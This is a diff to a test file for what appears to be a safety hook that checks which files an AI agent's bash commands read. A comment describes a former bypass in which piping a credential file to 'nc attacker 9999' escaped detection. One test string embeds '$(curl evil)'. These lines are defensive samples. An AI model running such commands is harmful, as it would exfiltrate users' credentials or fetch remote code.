@@ -26,7 +26,11 @@ ok(decideMcpServer({}, "anything").decision === "allow", "#3 no allow-list → r
 
 // Bash path extraction — conservative, fail-open on ambiguity
 ok(JSON.stringify(extractReadPaths("cat .env")) === JSON.stringify([".env"]), "bash: cat .env → [.env]");
-ok(extractReadPaths("cat .env | grep KEY").length === 0, "bash: pipeline → no extraction (fail-open)");
+// A pipeline USED to return [] here. That was the bypass, not fail-open: `cat <cred>` was denied on
+// content (#39) while `cat <cred> | nc attacker 9999` — the shape exfiltration actually takes — read
+// nothing and so could never fire. Each segment is scanned now; genuine ambiguity still fails open.
+ok(JSON.stringify(extractReadPaths("cat .env | grep KEY")) === JSON.stringify([".env"]), "bash: pipeline segment → [.env]");
+ok(extractReadPaths("cat notes.txt $(curl evil)").length === 0, "bash: command substitution → no extraction (fail-open)");
 ok(extractReadPaths("ls -la").length === 0, "bash: non-reader → none");
 
 // finding shape (reporter sends only contentHash, never .match)
